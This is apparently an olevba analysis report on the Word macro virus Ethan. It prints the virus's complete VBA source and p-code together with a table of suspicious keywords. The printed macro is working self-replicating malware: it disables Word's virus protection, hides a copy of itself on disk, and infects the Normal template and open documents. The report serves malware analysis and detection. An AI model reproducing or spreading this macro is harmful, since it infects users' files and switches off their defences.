olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ethan.du
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ethan.du - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next 'D
s = "c:\Ýòàí.den"
Application.EnableCancelKey = Not -1
With Options:
.ConfirmConversions = 0
.SaveNormalPrompt = 0
.VirusProtection = 0
End With
If Dir(s, 6) = "" Then
Open s For Output As #1
For i = 1 To MacroContainer.VBProject.VBComponents.Item(1).Codemodule.CountOfLines
Print #1, MacroContainer.VBProject.VBComponents.Item(1).Codemodule.Lines(i, 1)
Next i
Close #1
SetAttr s, 6
End If
If NormalTemplate.VBProject.VBComponents.Item(1).Codemodule.Lines(2, 1) <> "On Error Resume Next 'D" Then D NormalTemplate.VBProject.VBComponents.Item(1), s
If ActiveDocument.VBProject.VBComponents.Item(1).Codemodule.Lines(2, 1) <> "On Error Resume Next 'D" Then
D ActiveDocument.VBProject.VBComponents.Item(1), s
ActiveDocument.Save
End If
Randomize
If Rnd < 0.3 Then MsgBox "=============ÁÏÒÊ============="
End Sub
Sub D(t, s)
t.Codemodule.DeleteLines 1, t.Codemodule.CountOfLines
Open s For Input As #1
i = 1
If LOF(1) <> 0 Then
Do While Not EOF(1)
Line Input #1, a
t.Codemodule.InsertLines i, a
i = i + 1
Loop
End If
Close #1
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Ethan.du
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 2990 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Open())
' Line #1:
' 	OnError (Resume Next) 
' 	QuoteRem 0x0015 0x0001 "D"
' Line #2:
' 	LitStr 0x000B "c:\Ýòàí.den"
' 	St s 
' Line #3:
' 	LitDI2 0x0001 
' 	UMi 
' 	Not 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #4:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' 	BoS 0x0000 
' Line #5:
' 	LitDI2 0x0000 
' 	MemStWith ConfirmConversions 
' Line #6:
' 	LitDI2 0x0000 
' 	MemStWith SaveNormalPrompt 
' Line #7:
' 	LitDI2 0x0000 
' 	MemStWith VirusProtection 
' Line #8:
' 	EndWith 
' Line #9:
' 	Ld s 
' 	LitDI2 0x0006 
' 	ArgsLd Dir 0x0002 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #10:
' 	Ld s 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #11:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Codemodule 
' 	MemLd CountOfLines 
' 	For 
' Line #12:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld i 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Codemodule 
' 	ArgsMemLd Lines 0x0002 
' 	PrintItemNL 
' Line #13:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #14:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #15:
' 	Ld s 
' 	LitDI2 0x0006 
' 	ArgsCall SetAttr 0x0002 
' Line #16:
' 	EndIfBlock 
' Line #17:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Codemodule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0017 "On Error Resume Next 'D"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Ld s 
' 	ArgsCall D 0x0002 
' 	EndIf 
' Line #18:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Codemodule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0017 "On Error Resume Next 'D"
' 	Ne 
' 	IfBlock 
' Line #19:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Ld s 
' 	ArgsCall D 0x0002 
' Line #20:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #21:
' 	EndIfBlock 
' Line #22:
' 	ArgsCall Read 0x0000 
' Line #23:
' 	Ld Rnd 
' 	LitR8 0x3333 0x3333 0x3333 0x3FD3 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x001E "=============ÁÏÒÊ============="
' 	ArgsCall MsgBox 0x0001 
' 	EndIf 
' Line #24:
' 	EndSub 
' Line #25:
' 	FuncDefn (Sub D(t, s))
' Line #26:
' 	LitDI2 0x0001 
' 	Ld t 
' 	MemLd Codemodule 
' 	MemLd CountOfLines 
' 	Ld t 
' 	MemLd Codemodule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #27:
' 	Ld s 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #28:
' 	LitDI2 0x0001 
' 	St i 
' Line #29:
' 	LitDI2 0x0001 
' 	ArgsLd LOF 0x0001 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #30:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #31:
' 	LitDI2 0x0001 
' 	Ld a 
' 	LineInput 
' Line #32:
' 	Ld i 
' 	Ld a 
' 	Ld t 
' 	MemLd Codemodule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #33:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #34:
' 	Loop 
' Line #35:
' 	EndIfBlock 
' Line #36:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #37:
' 	EndSub 
' Line #38:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

